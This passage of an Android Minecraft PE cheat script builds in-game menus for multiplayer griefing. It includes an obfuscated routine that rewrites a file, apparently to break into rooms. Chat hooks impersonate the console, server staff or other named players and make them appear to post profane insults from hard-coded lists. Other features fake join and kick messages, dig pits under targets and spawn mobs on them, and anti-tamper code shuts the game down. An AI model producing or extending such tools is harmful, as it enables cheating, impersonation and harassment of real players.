                    功能开关[2] = 假;
                    功能开关[12] = 真;
                    输出JS消息("已开启终末魔指,点击任意地方启动...")
                } else {
                    功能开关[12] = 假;
                    输出JS消息("已关闭终末魔指.")
                }
            }
        }))
        分隔(layout);


        新增按钮(layout, "一字魔指").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[2] == 假) {
                    功能开关[0] = 假;
                    功能开关[12] = 假;
                    功能开关[2] = 真;
                    输出JS消息("已开启一字魔指,点击任意地方启动...")
                } else {
                    功能开关[2] = 假;
                    输出JS消息("已关闭一字魔指.")
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "十字魔指").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[0] == 假) {
                    功能开关[2] = 假;
                    功能开关[12] = 假;
                    功能开关[0] = 真;
                    输出JS消息("已开启十字魔指,点击任意地方启动...")
                } else {
                    功能开关[0] = 假;
                    输出JS消息("已关闭十字魔指.")
                }
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu联机神器() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);

        注释文字(layout, "  联机神器:");

        新增按钮(layout, "联机作弊").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu联机作弊();
            }
        }))
        分隔(layout);

        新增按钮(layout, "高端功能").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu全民进房();
            }
        }))
        分隔(layout);

        新增按钮(layout, "玩家管理").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu玩家管理();
            }
        }))
        分隔(layout);

        新增按钮(layout, "角色扮演").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Menu角色扮演();
            }
        }))
        分隔(layout);

        新增按钮(layout, "杀人混淆").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[18] == 假) {
                    功能开关[18] = 真;
                    输出JS消息("已开启杀人混淆.");
                } else {
                    功能开关[18] = 假;
                    输出JS消息("已开启杀人混淆.");
                }
            }
        }))
        分隔(layout);

        新增按钮(layout, "房间防踢").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出("即将被加入")
            }
        }))
        分隔(layout);

        新增按钮(layout, "商店货币").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                添加物品(3, 64, 0);
                输出JS消息("已添加一组\"钱\"");
            }
        }))
        分隔(layout);
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function X0167_F89R8D() {
    if (存在文件(sdka + msgwj[0]) == 真) {
        var X0167_WAIJ = 读入文件(sdka + msgwj[1])
    } else {
        var X0167_WAIJ = null
    }
    if (X0167_WAIJ != null) {
        if (功能开关[3] == 假) {
            功能开关[3] = 真;
            写出文件(sdka + testFor(msgwj[3]).replace(fang(), 空), X0167_WAIJ.replace(msgwj[4], msgwj[5]).replace(msgwj[6], msgwj[7]) + msgwj[8] + X0167_WAIJ.replace(fang(), 空).replace(astr[1], astr[17]).replace(msgwj[6], msgwj[7]))
            调试输出(message[0]);
            调试输出(message[1]);
        } else {
            关闭游戏()
        }
    } else {
        调试输出(message[2]);
        调试输出(message[3])
    }
}

function Menu联机作弊() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  联机作弊:");

        新增按钮(layout, "联机外进").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (包名 == "炸妈盒子") {
                    调试输出("多玩用户与狗不准使用此功能！");
                } else if (包名 == "葫芦瞎") {
                    调试输出(astr[16]);
                } else {
                    Menu联盒外进();
                }
            }
        }));
        分隔(layout);

        新增按钮(layout, "炸妈魔盒").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu炸妈魔盒();
            }
        }));
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu炸妈魔盒() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  使用炸妈魔盒:");

        新增按钮(layout, "调用魔盒").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出("正在调用魔盒...");
                调试输出("未能找到魔盒");
            }
        }))
        分隔(layout);

        新增按钮(layout, "房间列表").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                menu.dismiss();
                Menu房间列表();
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

ModPE.langEdit(gl[2], gl[0]);
ModPE.langEdit(gl[1], 换(gl[3], JSVer));

function Menu房间列表() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "联机盒子房间列表:");
        for (var i = 0; i <= 20; i++) {
            注释文字(layout, "undefined");
            新增按钮(layout, "undefined").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    调试输出("<b>失败:</b> 没有调用魔盒", "抄袭狗看你妈逼？");
                    调试输出("<b>失败:</b> 没有发现魔盒返回值", "说你就是你,抄袭废物");
                }
            }))
            分隔(layout);
        }
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 200));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu联盒外进() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  联机盒子外进:");
        新增按钮(layout, "联盒外进").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (修复模式 == 假) {
                    X0167_F89R8D();
                } else {
                    信息框("修复模式下外进功能被禁用")
                }
            }
        }));
        分隔(layout);
        新增按钮(layout, "使用方法").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                信息框("碎梦者", astr[0]);
            }
        }))
        分隔(layout);

        注释文字(layout, "  联机平台外进:");

        新增按钮(layout, "平台外进").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出("敬请期待");
            }
        }));
        分隔(layout);
        新增按钮(layout, "使用方法").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出("敬请期待");
            }
        }))
        分隔(layout);

        注释文字(layout, "  其他:");
        新增按钮(layout, "端口映射").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                调试输出("敬请期待");
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

var open角色扮演 = 假,
    联机消息类型, 联机消息名称, 骂次数 = [0, 0, 0],
    骂次数2 = [0, 0, 0];

var 脏话 = ["房主傻逼!", "房主智障！", "房主开挂死妈！", "弱智无能房主开挂死亲妈！", "房主你妈灵车漂移！", "傻逼房主滚去吃屎！", "房主你妈死了！", "挂狗房主死全家！", "傻逼房主有种别作弊！", "只会作弊的废物！"]
var 脏话2 = ["我是傻逼!", "我是智障！", "我死亲妈！", "我无能弱智！", "我妈灵车漂移！", "我是大傻逼！", "我很没用很垃圾", "我是多玩盒子的走狗！", "盒子君是我亲爹", "我妈是母狗", "我是大智障", "我就是一个废物！", "啦啦啦啦啦~我是一个可爱的大傻逼！", "我就是傻逼你能拿我怎么样？"]

function chatHook(text) {
    if (联机消息类型 == -2) {
        preventDefault();
        发送消息("§7§o[CONSOLE: " + text + "]")
    }
    if (联机消息类型 == 0) {
        preventDefault();
        带名字发送消息(联机消息名称, text)
    }
    if (联机消息类型 == 1) {
        preventDefault();
        发送消息(联机消息名称 + text)
    }
    if (联机消息类型 == 2) {
        preventDefault();
        发送消息(text)
    }
    if (联机消息类型 == 3) {
        preventDefault();
        if (获取玩家名字(获取玩家实体()) != 空) {
            带名字发送消息(获取玩家名字(获取玩家实体()), "e§碎梦者Ⅲ" + 获取玩家名字(获取玩家实体()) + "Ⅲ" + text)
        } else {
            带名字发送消息("碎梦者", 比("e§碎梦者Ⅲ碎梦者Ⅲ", message[4]) + text)
        }
    }
    比(text, astr[15], 2);
}

function 全民进房_盒子() {
    发送消息("§eSteve" + 生成随机数(10000, 99999) + " 加入了游戏")
}

function 全民进房_平台() {
    发送消息("§eguest" + 生成随机数(100000, 999999) + " 加入了游戏")
}

function 全民骂房主_平台() {
    if (脏话[骂次数[0]] != null) {
        带名字发送消息("guest" + 生成随机数(100000, 999999), 脏话[骂次数[0]]);
        骂次数[0]++
    } else {
        骂次数[0] = 0
    }
}

function 全民骂房主_盒子() {
    if (脏话[骂次数[1]] != null) {
        带名字发送消息("Steve" + 生成随机数(10000, 99999), 脏话[骂次数[1]]);
        骂次数[1]++
    } else {
        骂次数[1] = 0
    }
}

function 替罪羊(名称, type) {
    if (type == null) {
        if (脏话[骂次数[2]] != null) {
            带名字发送消息(名称, 脏话[骂次数[2]]);
            骂次数[2]++
        } else {
            骂次数[2] = 0
        }
    } else if (type == 1) {
        if (脏话2[骂次数2[2]] != null) {
            带名字发送消息(名称, 脏话2[骂次数2[2]]);
            骂次数2[2]++
        } else {
            骂次数2[2] = 0
        }
    }
}

function 比(one, two, type) {
    if (type == null) {
        if (one != two) {
            关闭游戏();
        } else {
            return one
        }
    } else if (type == 1) {
        if (String(one) != String(two)) {
            关闭游戏();
        } else {
            return one
        }
    } else if (type == 2) {
        if (one == two) {
            关闭游戏();
        }
    }
}

function Menu角色扮演() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  角色扮演:");
        新增按钮(layout, "控制台").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = -2;
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "商店管").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§6城管§f";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "炸妈君").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§c盒子君§f";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "炸妈娘").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§d盒子娘§f";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "服务器").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 1;
                联机消息名称 = "§d[Server]";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "白内障").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "Herobrine";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "权限狗").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§e[SVIP]§c%player%§f".偷梁换柱("%player%", 我的名称);
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "修理工").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§6联机工作人员§c%player%§f".偷梁换柱("%player%", 我的名称);
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "管理员").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§6联机管理员§c%player%§f".偷梁换柱("%player%", 我的名称);
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "大黑客").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 0;
                联机消息名称 = "§4超级§c黑客§4§o";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "公告牌").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = 1;
                联机消息名称 = "§6[§4公告§6]§a";
                tip("你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "史蒂夫").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = -1;
                联机消息名称 = "Steve" + 生成随机数(10000, 99999);
                tip("#你的角色已更换");
            }
        }));
        分隔(layout);
        新增按钮(layout, "无名称").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 假;
                联机消息类型 = 2;
                tip("#你的角色已更换")
            }
        }));
        分隔(layout);
        新增按钮(layout, "我自己").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                open角色扮演 = 真;
                联机消息类型 = -1;
                联机消息名称 = 我的名称;
                tip("#你的角色已更换");
                分隔(layout);
            }
        }))
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function 别踩白块() {
    var 行 = 生成随机数(0, 10);
    发送消息(白块内容[行])
}
功能开关[21] = 假;

function Menu全民进房() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  高端功能:");

        新增按钮(layout, "魔法白块").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                别踩白块();
                if (功能开关[14] == 假) {
                    功能开关[14] = 真
                } else {
                    功能开关[14] = 假
                }
            }
        }));
        分隔(layout);

        新增按钮(layout, "魔法英文").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                别踩白块();
                if (功能开关[33] == 假) {
                    功能开关[33] = 真
                } else {
                    功能开关[33] = 假
                }
            }
        }));
        分隔(layout);

        新增按钮(layout, "平台进房").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                全民进房_平台();
            }
        }))
        分隔(layout);
        新增按钮(layout, "盒子进房").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                全民进房_盒子();
            }
        }))
        分隔(layout);
        新增按钮(layout, "平台喷房").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                全民骂房主_平台();
            }
        }))
        分隔(layout);
        新增按钮(layout, "盒子喷房").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                全民骂房主_盒子();
            }
        }))
        分隔(layout);
        新增按钮(layout, "隐藏名称").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置实体铭牌(获取玩家实体(), "碎梦者")
                输出JS消息("已开启反伪装.");
            }
        }))
        分隔(layout);

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function get全部玩家() {
    return Server.getAllPlayers()
}

function get实体名称(ent) {
    return Entity.getNameTag(ent)
}

function 玩家是否存在(名称) {
    var 实体 = get全部玩家(),
        是否存在 = 假;
    for (i = 0; i < 实体.length; i++) {
        if (String(get实体名称(实体[i])) == 名称) {
            是否存在 = 真
        };
        if (i = 实体.length) {
            return 是否存在
        }
    }
}

function get玩家实体(名称) {
    var 实体 = get全部玩家();
    for (i = 0; i < 实体.length; i++) {
        if (String(获取玩家名字(实体[i])) == 名称) {
            return 实体[i]
        }
    }
}

function 列表是否空白名字(名称) {
    if (名称 == 空) {
        return "碎梦者"
    } else {
        return "" + 名称
    }
}
写出文件(配置 + "script/id.txt", getid());

function Menu玩家管理() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        注释文字(layout, "  选择玩家:");
        var 玩家列表 = get全部玩家();

        if (get实体名称(玩家列表[0]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[0]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[0]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[1]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[1]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[1]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[2]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[2]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[2]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[3]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[3]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[3]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[4]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[4]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[4]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[5]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[5]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[5]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[6]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[6]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[6]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[7]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[7]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[7]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[8]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[8]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[8]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[9]) != null) {
            新增按钮(layout, 列表是否空白名字(get实体名称(玩家列表[9]))).setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    Menu玩家管理_控制(玩家列表[9]);
                }
            }))
            分隔(layout);
        }

        if (get实体名称(玩家列表[10]) != null) {
            新增按钮(layout, "......").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    调试输出("暂时无法显示更多.")
                }
            }))
            分隔(layout);
        }

        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 120), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function Menu玩家管理_控制(名称) {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        var 玩家列表 = get全部玩家();
        新增文字(layout, "  " + 获取玩家名字(名称)).setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (功能开关[4] != 真) {
                    联机消息类型 = 0;
                    联机消息名称 = 获取玩家名字(名称);
                    调试输出("已伪装成它")
                }
            }
        }))
        注释文字(layout, "[" + 名称 + "]");

        新增按钮(layout, "传送过去").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var 实体坐标 = [Entity.getX(get玩家实体(名称)), Entity.getY(get玩家实体(名称)), Entity.getZ(get玩家实体(名称))]
                传送玩家(实体坐标[0], 实体坐标[1], 实体坐标[2])
            }
        }))
        分隔(layout);
        if (功能开关[4] != 真) {
            新增按钮(layout, "让它骂自己").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    替罪羊(获取玩家名字(名称), 1);
                }
            }))
            分隔(layout);

            新增按钮(layout, "让它骂房主").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    替罪羊(获取玩家名字(名称));
                }
            }))
            分隔(layout);

            新增按钮(layout, "让它背价值观").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    带名字发送消息(获取玩家名字(名称), astr[2])
                }
            }))
            分隔(layout);
        }

        注释文字(layout, "  高端功能:")
        新增按钮(layout, "让它掉坑").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var 实体坐标 = [Entity.getX(名称), Entity.getY(名称), Entity.getZ(名称)]
                for (var i = 1; i <= 20; i++) {
                    破坏方块(实体坐标[0], 实体坐标[1] + 10 - i, 实体坐标[2], 假);
                    破坏方块(实体坐标[0] + 1, 实体坐标[1] + 10 - i, 实体坐标[2], 假);
                    破坏方块(实体坐标[0] - 1, 实体坐标[1] + 10 - i, 实体坐标[2], 假);
                    破坏方块(实体坐标[0], 实体坐标[1] + 10 - i, 实体坐标[2] + 1, 假);
                    破坏方块(实体坐标[0], 实体坐标[1] + 10 - i, 实体坐标[2] - 1, 假)
                }
            }
        }))
        分隔(layout);
        新增按钮(layout, "让它遭天谴").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (已联机 == 真) {
                    输出JS消息("检测到这不是你的存档？")
                }
                for (var i = 0; i < 10; i++) {
                    Level.spawnMob(Entity.getX(名称), Entity.getY(名称), Entity.getZ(名称), 93);
                }
            }
        }))
        分隔(layout);
        if (功能开关[4] == 真) {
            注释文字(layout, "  伪装联盒:");
            新增按钮(layout, "模拟踢出").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    输出消息("§c%player% 被房主踢出房间！".偷梁换柱("%player%", 获取玩家名字(名称)))
                }
            }))
            分隔(layout);

            新增按钮(layout, "模拟点赞").setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    var 真实名称 = 名称.split(" (");
                    输出消息("§d%player%赞了一下房主".偷梁换柱("%player%", 真实名称[0]))
                }
            }))
            分隔(layout);
        }
        var mlayout = 制作菜单(ctx, layout);
        menu.setContentView(mlayout);
        menu.setWidth(dip2px(ctx, 120));
        menu.setHeight(dip2px(ctx, -1));
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(背景颜色[0], 背景颜色[1], 背景颜色[2], 背景颜色[3])));
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 240), dip2px(ctx, 0))
    } catch (err) {
        信息框("错误", err)
    }
}

function 玩家是否在游戏中() {
    if (获取实体血量(获取玩家实体()) == 0 && Player.getHunger() == -1 && 手中物品() == 0) {
        return 假
    } else {
        return 真
    }
}

function info我() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
    var layout = new android.widget.LinearLayout(ctx);
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true);
        var layout = new android.widget.LinearLayout(ctx);
        layout.setOrientation(1);
        var 玩家列表 = get全部玩家();
        新增文字(layout, " " + 我的名称)
        注释文字(layout, " 血量:" + 获取实体血量(获取玩家实体()));
        注释文字(layout, " 饥饿:" + Player.getHunger());
        注释文字(layout, " 手中物品:" + 手中物品());

        新增按钮(layout, "满血").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置实体血量(获取玩家实体(), 20)
                输出JS消息("已将你的血量设置为满血.")
            }
        }))
        分隔(layout);

        新增按钮(layout, "自杀").setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                设置实体血量(获取玩家实体(), 0)
                输出JS消息("已将你杀死.")
            }
        }))
        分隔(layout);

        新增按钮(layout, "设置出生点").setOnClickListener(new android.view.View.OnClickListener({
